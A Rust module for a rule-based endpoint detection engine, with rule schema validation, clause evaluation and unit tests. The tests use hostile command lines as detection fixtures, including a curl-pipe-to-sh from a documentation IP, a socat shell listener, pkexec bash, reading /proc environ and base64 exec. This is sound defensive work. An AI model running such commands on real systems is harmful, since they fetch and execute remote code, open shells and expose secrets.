use anyhow::{anyhow, bail, Result};
use regex::Regex as Re;
use serde::Deserialize;
use serde_json::{json, Value};
use std::collections::HashSet;
use std::fs;
use std::path::Path;

use crate::detect::types::NormalizedAlert;
use crate::detect::{Detector, Finding};
// keep the rest of the file using NormalizedEvent without refactors
type NormalizedEvent = NormalizedAlert;

/// Rules file schema version this build reads.
const SCHEMA_VERSION: u32 = 1;

// Unknown keys are errors. A file written for another schema fails at load
// instead of loading as rules with no clauses that match every event.
#[derive(Debug, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct RuleSet {
    pub version: u32,
    pub rules: Vec<Rule>,
}

#[derive(Debug, Deserialize, Clone)]
#[serde(deny_unknown_fields)]
pub struct Rule {
    pub id: String,
    pub name: String,
    #[serde(default)]
    pub description: Option<String>,
    pub severity: f32, // [0,1]
    #[serde(default = "enabled_by_default")]
    pub enabled: bool,
    #[serde(default)]
    pub mitre: Vec<String>,
    #[serde(default)]
    pub all: Vec<Clause>, // AND
    #[serde(default)]
    pub any: Vec<Clause>, // OR
    #[serde(default)]
    pub none: Vec<Clause>, // NOT
}

fn enabled_by_default() -> bool {
    true
}

#[derive(Debug, Deserialize, Clone)]
#[serde(deny_unknown_fields)]
pub struct Clause {
    pub field: String,
    pub op: Op,
    pub value: Value,
    // Set by compile() at load, never read from JSON.
    #[serde(skip)]
    target: Option<Field>,
    #[serde(skip)]
    re: Option<Re>,
}

#[derive(Debug, Deserialize, Clone, Copy)]
#[serde(rename_all = "lowercase")]
pub enum Op {
    Eq,
    Ne,
    Gt,
    Ge,
    Lt,
    Le,
    Contains,
    Startswith,
    Endswith,
    Regex,
}

/// Where a rule field lives on the event, resolved once at load.
#[derive(Debug, Clone)]
enum Field {
    Attr(String),   // dotted path under attributes
    Entity(String), // dotted path under entities
    Id,
    Source,
    ConnectorId,
    Title,
    ShortWhy,
    Severity,
    Ts,
    Mitre,
}

pub struct RulesDetector {
    rules: Vec<Rule>,
}

impl RulesDetector {
    pub fn from_file(path: &Path) -> Result<Self> {
        let s = fs::read_to_string(path)
            .map_err(|e| anyhow!("cannot read rules file {}: {e}", path.display()))?;
        // The cause goes into the message itself because callers print with {e}.
        Self::from_json(&s).map_err(|e| anyhow!("invalid rules file {}: {e:#}", path.display()))
    }

    /// Parse and validate a rules document. Any schema mismatch is an error.
    pub fn from_json(s: &str) -> Result<Self> {
        let mut rs: RuleSet = serde_json::from_str(s)?;
        if rs.version != SCHEMA_VERSION {
            bail!(
                "unsupported rules version {} (this build reads version {SCHEMA_VERSION})",
                rs.version
            );
        }
        let mut seen = HashSet::new();
        for (i, r) in rs.rules.iter_mut().enumerate() {
            compile_rule(r).map_err(|e| anyhow!("rule #{} ({}): {e:#}", i + 1, r.id))?;
            if !seen.insert(r.id.clone()) {
                bail!("rule #{} reuses id {}", i + 1, r.id);
            }
        }
        // Disabled rules are still validated above, then dropped.
        rs.rules.retain(|r| r.enabled);
        Ok(Self { rules: rs.rules })
    }

    pub fn len(&self) -> usize {
        self.rules.len()
    }

    pub fn is_empty(&self) -> bool {
        self.rules.is_empty()
    }
}

impl Detector for RulesDetector {
    fn name(&self) -> &'static str {
        "rules"
    }

    fn score(&self, e: &NormalizedEvent, _features: &[f64]) -> Vec<Finding> {
        let mut out = Vec::new();
        for r in &self.rules {
            if eval_rule(r, e) {
                out.push(Finding {
                    source: "rules".to_string(),
                    score: r.severity.clamp(0.0, 1.0) as f32,
                    label: Some(r.id.clone()),
                    details: Some(json!({ "name": r.name, "mitre": r.mitre })),
                });
            }
        }
        out
    }
}

// ---- load-time validation ----

fn compile_rule(r: &mut Rule) -> Result<()> {
    if r.id.trim().is_empty() {
        bail!("empty id");
    }
    if !(0.0..=1.0).contains(&r.severity) {
        bail!("severity {} is outside [0, 1]", r.severity);
    }
    // A rule with only `none` clauses, or none at all, would match every event.
    if r.all.is_empty() && r.any.is_empty() {
        bail!("no `all` or `any` clauses, so it would match every event");
    }
    for c in r.all.iter_mut().chain(r.any.iter_mut()).chain(r.none.iter_mut()) {
        c.compile()?;
    }
    Ok(())
}

impl Clause {
    fn compile(&mut self) -> Result<()> {
        let target = resolve_field(&self.field)
            .ok_or_else(|| anyhow!("unknown event field `{}`", self.field))?;
        let op = format!("{:?}", self.op).to_lowercase();
        let value_ok = match self.op {
            Op::Gt | Op::Ge | Op::Lt | Op::Le => self.value.is_number(),
            Op::Eq | Op::Ne => self.value.is_string() || self.value.is_number(),
            Op::Contains | Op::Startswith | Op::Endswith | Op::Regex => self.value.is_string(),
        };
        if !value_ok {
            bail!("`{op}` on `{}` has the wrong value type: {}", self.field, self.value);
        }
        if let Op::Regex = self.op {
            let re = Re::new(as_str(&self.value)).map_err(|e| {
                let why = e.to_string();
                let last = why.lines().last().unwrap_or("").trim().to_string();
                anyhow!("bad regex on `{}`: {last}", self.field)
            })?;
            self.re = Some(re);
        }
        self.target = Some(target);
        Ok(())
    }
}

fn resolve_field(f: &str) -> Option<Field> {
    // attributes.* / entities.* support dotted paths (and numeric indexes)
    if let Some(rest) = f.strip_prefix("attributes.") {
        return Some(Field::Attr(rest.to_string()));
    }
    if let Some(rest) = f.strip_prefix("entities.") {
        return Some(Field::Entity(rest.to_string()));
    }
    // Back-compat alias: attrs.* -> attributes.*
    if let Some(rest) = f.strip_prefix("attrs.") {
        return Some(Field::Attr(rest.to_string()));
    }
    // tags.foo -> attributes.tags.foo, which Telemetry sets to "true" for each tag
    if f.starts_with("tags.") {
        return Some(Field::Attr(f.to_string()));
    }
    let field = match f {
        // Telemetry fields, read from attributes
        "category" | "event" | "exe" | "cmdline" | "cwd" => Field::Attr(f.to_string()),
        // File events carry the file path in binary_path, which Telemetry exposes as exe.
        "path" => Field::Attr("exe".to_string()),
        // Top-level fields on NormalizedAlert
        "id" => Field::Id,
        "source" => Field::Source,
        "connector_id" => Field::ConnectorId,
        "title" => Field::Title,
        "short" | "short_why" => Field::ShortWhy,
        "severity" => Field::Severity,
        "ts" => Field::Ts,
        "mitre" => Field::Mitre,
        "attributes" => Field::Attr(String::new()),
        "entities" => Field::Entity(String::new()),
        _ => return None,
    };
    Some(field)
}

// ---- evaluation ----

fn eval_rule(r: &Rule, e: &NormalizedEvent) -> bool {
    // Load rejects these, and the evaluator never treats them as a match either.
    if r.all.is_empty() && r.any.is_empty() {
        return false;
    }
    if !r.all.iter().all(|c| eval_clause(c, e)) {
        return false;
    }
    if !r.any.is_empty() && !r.any.iter().any(|c| eval_clause(c, e)) {
        return false;
    }
    if r.none.iter().any(|c| eval_clause(c, e)) {
        return false;
    }
    true
}

fn lookup(field: &Field, e: &NormalizedEvent) -> Option<String> {
    match field {
        Field::Attr(p) => get_path_as_string(&e.attributes, p),
        Field::Entity(p) => get_path_as_string(&e.entities, p),
        Field::Id => Some(e.id.clone()),
        Field::Source => Some(e.source.clone()),
        Field::ConnectorId => Some(e.connector_id.clone()),
        Field::Title => Some(e.title.clone()),
        Field::ShortWhy => Some(e.short_why.clone()),
        Field::Severity => Some(format!("{}", e.severity)),
        Field::Ts => Some(e.ts.to_rfc3339()),
        Field::Mitre => Some(e.mitre.join(",")),
    }
}

fn eval_clause(c: &Clause, e: &NormalizedEvent) -> bool {
    let Some(field) = c.target.as_ref() else {
        return false;
    };
    let v = lookup(field, e);
    match c.op {
        Op::Eq => eq_cmp(&v, &c.value),
        Op::Ne => !eq_cmp(&v, &c.value),
        Op::Gt => num_cmp(&v, &c.value, |a, b| a > b),
        Op::Ge => num_cmp(&v, &c.value, |a, b| a >= b),
        Op::Lt => num_cmp(&v, &c.value, |a, b| a < b),
        Op::Le => num_cmp(&v, &c.value, |a, b| a <= b),
        Op::Contains => v.map(|s| s.contains(as_str(&c.value))).unwrap_or(false),
        Op::Startswith => v.map(|s| s.starts_with(as_str(&c.value))).unwrap_or(false),
        Op::Endswith => v.map(|s| s.ends_with(as_str(&c.value))).unwrap_or(false),
        Op::Regex => match (&c.re, v) {
            (Some(re), Some(s)) => re.is_match(&s),
            _ => false,
        },
    }
}

fn as_str(v: &Value) -> &str {
    v.as_str().unwrap_or("")
}

fn eq_cmp(lhs: &Option<String>, rhs: &Value) -> bool {
    match (lhs, rhs) {
        (Some(l), Value::Number(n)) => l.parse::<f64>().ok() == n.as_f64(),
        (Some(l), _) => l == as_str(rhs),
        _ => false,
    }
}

fn num_cmp<F: Fn(f64, f64) -> bool>(lhs: &Option<String>, rhs: &Value, f: F) -> bool {
    if let (Some(l), Some(r)) = (
        lhs.as_ref().and_then(|s| s.parse::<f64>().ok()),
        rhs.as_f64(),
    ) {
        f(l, r)
    } else {
        false
    }
}

/// Traverse a serde_json::Value by dotted path and coerce the leaf into String if possible.
/// Supports numeric array indexes as path components (e.g., "target.0.id").
fn get_path_as_string(root: &Value, path: &str) -> Option<String> {
    let mut cur = root;
    if path.is_empty() {
        return Some(cur.to_string());
    }
    for part in path.split('.') {
        if let Ok(idx) = part.parse::<usize>() {
            cur = cur.get(idx)?;
        } else {
            cur = match cur {
                Value::Object(map) => map.get(part)?,
                _ => return None,
            };
        }
    }
    match cur {
        Value::String(s) => Some(s.clone()),
        Value::Number(n) => Some(n.to_string()),
        Value::Bool(b) => Some(b.to_string()),
        other => Some(other.to_string()),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::pipeline::{Evaluator, Thresholds};
    use crate::telemetry::{Telemetry, TelemetryRecord};

    fn shipped() -> RulesDetector {
        let path = Path::new(env!("CARGO_MANIFEST_DIR")).join("src/rules.json");
        RulesDetector::from_file(&path).expect("shipped src/rules.json must load")
    }

    // Built the way main.rs builds it: TelemetryRecord -> Telemetry, then category and event.
    fn ev(category: &str, event: &str, exe: &str, cmdline: &str, tags: &[&str]) -> Telemetry {
        let rec = TelemetryRecord {
            timestamp: 1_700_000_000,
            pid: 4242,
            ppid: 1,
            uid: 1000,
            binary_path: exe.to_string(),
            command_line: cmdline.to_string(),
            tags: tags.iter().map(|t| t.to_string()).collect(),
            ..Default::default()
        };
        let mut t = Telemetry::from(rec);
        t.category = category.to_string();
        t.event = event.to_string();
        t
    }

    fn evaluator() -> Evaluator {
        let mut e = Evaluator::new(Thresholds {
            low: 0.30,
            medium: 0.55,
            high: 0.80,
        });
        // Audit mode returns an alert even below the low threshold, so findings are visible.
        e.set_audit_benign(true);
        e.registry.add(Box::new(shipped()));
        e
    }

    // Rule ids that fired for one event, through the real Evaluator.
    fn fired(e: &mut Evaluator, t: &Telemetry) -> Vec<String> {
        let alert = e.evaluate(t).expect("evaluate").expect("audit mode alert");
        let mut ids: Vec<String> = alert.findings.iter().filter_map(|f| f.label.clone()).collect();
        ids.sort();
        ids
    }

    #[test]
    fn shipped_rules_load_with_unique_ids() {
        let det = shipped();
        assert_eq!(det.len(), 22);
        let ids: HashSet<&str> = det.rules.iter().map(|r| r.id.as_str()).collect();
        assert_eq!(ids.len(), 22);
    }

    #[test]
    fn benign_events_match_no_rule() {
        let mut e = evaluator();
        let benign = [
            ev("process", "exec", "/usr/bin/ls", "ls -la /home/alice", &["exec", "process::exec"]),
            ev("process", "exec", "/usr/bin/python3", "python3 manage.py runserver", &["exec"]),
            ev("process", "exec", "/usr/bin/sudo", "sudo -s -u root", &["exec"]),
            ev("process", "exec", "/tmp/snap/tool", "/tmp/snap/tool --version", &["exec"]),
            ev("process", "exec", "/usr/bin/rclone", "rclone --help", &["exec"]),
            ev("file", "open", "/etc/hosts", "curl https://example.com", &["file", "file_access"]),
            ev("file", "write", "/home/alice/notes.txt", "vim notes.txt", &["file", "write"]),
            ev("network", "connect", "", "/usr/sbin/sshd -D", &["network", "tcp_state"]),
            ev("unknown", "unknown", "", "", &[]),
        ];
        for t in &benign {
            assert!(fired(&mut e, t).is_empty(), "benign event fired: {t:?}");
        }
    }

    #[test]
    fn each_rule_fires_alone_on_its_own_event() {
        let fa = &["file", "file_access", "flags:0", "ret:3"];
        let fw = &["file", "write"];
        let cases = [
            ("R001", ev("file", "open", "/etc/init.d/updater", "vim /etc/init.d/updater", fa)),
            ("R002", ev("file", "open", "/tmp/stage.sh", "vim /tmp/stage.sh", fa)),
            ("R003", ev("file", "open", "/proc/1234/environ", "cat /proc/1234/environ", fa)),
            (
                "R004",
                ev("file", "open", "state/calibration/rolling_calibration.json", "forensic_hooks", fa),
            ),
            (
                "proc_powershell_encoded",
                ev("process", "exec", "/usr/bin/pwsh", "pwsh -EncodedCommand SQBFAFgA", &["exec"]),
            ),
            (
                "proc_shell_curlpipe",
                ev("process", "exec", "/bin/sh", "sh -c curl -fsSL http://203.0.113.5/x | sh", &[]),
            ),
            ("proc_exec_from_tmp", ev("process", "exec", "/tmp/.x/payload", "/tmp/.x/payload", &[])),
            ("linux_cron_persist_write", ev("file", "write", "/etc/cron.d/updater", "", fw)),
            (
                "linux_systemd_user_persist",
                ev("file", "write", "/home/alice/.config/systemd/user/updater.service", "", fw),
            ),
            (
                "credential_artifacts_sshkeys",
                ev("file", "write", "/home/alice/.ssh/authorized_keys", "", fw),
            ),
            (
                "susp_python_inline_b64",
                ev(
                    "process",
                    "exec",
                    "/usr/bin/python3",
                    "python3 -c import base64;exec(base64.b64decode('cHJpbnQoMSk='))",
                    &[],
                ),
            ),
            (
                "sudo_noninteractive_pass",
                ev("process", "exec", "/usr/bin/sudo", "sudo -S -k apt update", &[]),
            ),
            ("pkexec_spawn", ev("process", "exec", "/usr/bin/pkexec", "pkexec /bin/bash", &[])),
            (
                "net_beacon_tag_escalation",
                ev("network", "connect", "", "/usr/bin/updater", &["network", "cadence", "anomaly"]),
            ),
            (
                "entropy_blob_write",
                ev("file", "write", "/var/tmp/blob.bin", "", &["file", "write", "high_entropy_blob"]),
            ),
            (
                "mahala_outlier_escalation",
                ev("process", "exec", "/usr/bin/ls", "ls", &["mahalanobis_outlier"]),
            ),
            (
                "elliptic_outlier_escalation",
                ev("process", "exec", "/usr/bin/ls", "ls", &["elliptic_outlier"]),
            ),
            (
                "krim_graph_alert_escalation",
                ev("process", "exec", "/usr/bin/ls", "ls", &["krim_alert"]),
            ),
            (
                "office_spawns_shell",
                ev(
                    "process",
                    "exec",
                    "/usr/lib/libreoffice/program/soffice.bin",
                    "soffice.bin --headless -c bash -i",
                    &[],
                ),
            ),
            (
                "suspicious_tools_collection",
                ev("process", "exec", "/usr/bin/socat", "socat TCP-LISTEN:4444,fork EXEC:/bin/bash", &[]),
            ),
            (
                "script_interpreter_from_user_dir",
                ev("process", "exec", "/home/alice/.local/bin/node", "node server.js", &[]),
            ),
            (
                "windows_run_keys_modify",
                ev(
                    "file",
                    "write",
                    r"\Registry\Machine\Software\Microsoft\Windows\CurrentVersion\Run\updater",
                    "",
                    fw,
                ),
            ),
        ];

        // Every shipped rule needs a case here.
        let covered: HashSet<String> = cases.iter().map(|(id, _)| id.to_string()).collect();
        let shipped_ids: HashSet<String> = shipped().rules.iter().map(|r| r.id.clone()).collect();
        assert_eq!(covered, shipped_ids);

        let mut e = evaluator();
        for (id, t) in &cases {
            assert_eq!(fired(&mut e, t), vec![id.to_string()], "case for {id}");
        }
    }

    #[test]
    fn file_rules_match_both_decoder_tags() {
        let mut e = evaluator();
        // Perf decoder (file_access) and ring buffer decoder (file_open) name the same openat.
        let perf = ev("file", "open", "/proc/77/environ", "cat", &["file", "file_access"]);
        let ring = ev("file", "open", "/proc/77/environ", "cat", &["file_open", "comm:cat"]);
        assert_eq!(fired(&mut e, &perf), vec!["R003"]);
        assert_eq!(fired(&mut e, &ring), vec!["R003"]);
        // An exec of the same path carries neither tag.
        let exec = ev("process", "exec", "/proc/77/environ", "cat", &["exec"]);
        assert!(fired(&mut e, &exec).is_empty());
    }

    #[test]
    fn old_match_schema_is_rejected() {
        let old = r#"{"version":1,"rules":[{"id":"R001","name":"x","severity":0.9,
            "match":{"category":"file","signal":"file_access"}}]}"#;
        let err = RulesDetector::from_json(old).err().expect("must fail").to_string();
        assert!(err.contains("unknown field `match`"), "{err}");
    }

    #[test]
    fn rule_without_positive_clauses_is_rejected() {
        let empty = r#"{"version":1,"rules":[{"id":"R1","name":"x","severity":0.5}]}"#;
        let none_only = r#"{"version":1,"rules":[{"id":"R1","name":"x","severity":0.5,
            "none":[{"field":"exe","op":"eq","value":"/bin/true"}]}]}"#;
        for doc in [empty, none_only] {
            let err = RulesDetector::from_json(doc).err().expect("must fail").to_string();
            assert!(err.contains("no `all` or `any` clauses"), "{err}");
        }
    }

    #[test]
    fn empty_rule_never_matches_even_if_built_directly() {
        let r = Rule {
            id: "R1".into(),
            name: "x".into(),
            description: None,
            severity: 0.5,
            enabled: true,
            mitre: vec![],
            all: vec![],
            any: vec![],
            none: vec![],
        };
        let t = ev("process", "exec", "/usr/bin/ls", "ls", &[]);
        let alert = NormalizedAlert {
            id: "t".into(),
            ts: chrono::Utc::now(),
            source: "agent".into(),
            connector_id: "edr-agent".into(),
            severity: 0.0,
            title: "telemetry".into(),
            short_why: String::new(),
            entities: json!({}),
            attributes: serde_json::to_value(&t).unwrap(),
            mitre: vec![],
        };
        assert!(!eval_rule(&r, &alert));
    }

    #[test]
    fn bad_clauses_are_rejected() {
        let cases = [
            (r#"{"field":"event.exe","op":"eq","value":"x"}"#, "unknown event field `event.exe`"),
            (r#"{"field":"exe","op":"regex","value":"(unclosed"}"#, "bad regex on `exe`"),
            (r#"{"field":"exe","op":"regex","value":"^(?!/usr)"}"#, "bad regex on `exe`"),
            (r#"{"field":"cmdline","op":"gt","value":"high"}"#, "wrong value type"),
            (r#"{"field":"exe","op":"contains","value":true}"#, "wrong value type"),
            (r#"{"field":"exe","op":"like","value":"x"}"#, "unknown variant `like`"),
        ];
        for (clause, want) in cases {
            let doc = format!(
                r#"{{"version":1,"rules":[{{"id":"R1","name":"x","severity":0.5,"all":[{clause}]}}]}}"#
            );
            let err = RulesDetector::from_json(&doc).err().expect("must fail").to_string();
            assert!(err.contains(want), "{clause}: {err}");
        }
    }

    #[test]
    fn set_level_errors_are_rejected() {
        let rule = r#"{"id":"R1","name":"x","severity":0.5,"all":[{"field":"exe","op":"eq","value":"x"}]}"#;
        let dup = format!(r#"{{"version":1,"rules":[{rule},{rule}]}}"#);
        let v2 = format!(r#"{{"version":2,"rules":[{rule}]}}"#);
        let sev = r#"{"version":1,"rules":[{"id":"R1","name":"x","severity":5,"all":[{"field":"exe","op":"eq","value":"x"}]}]}"#;
        for (doc, want) in [
            (dup.as_str(), "reuses id R1"),
            (v2.as_str(), "unsupported rules version 2"),
            (sev, "outside [0, 1]"),
        ] {
            let err = RulesDetector::from_json(doc).err().expect("must fail").to_string();
            assert!(err.contains(want), "{err}");
        }
    }

    #[test]
    fn disabled_rule_is_validated_then_dropped() {
        let doc = r#"{"version":1,"rules":[{"id":"R1","name":"x","severity":0.5,"enabled":false,
            "all":[{"field":"exe","op":"eq","value":"/bin/x"}]}]}"#;
        assert!(RulesDetector::from_json(doc).unwrap().is_empty());
        let bad = r#"{"version":1,"rules":[{"id":"R1","name":"x","severity":0.5,"enabled":false,
            "all":[{"field":"nope","op":"eq","value":"/bin/x"}]}]}"#;
        assert!(RulesDetector::from_json(bad).is_err());
    }
}
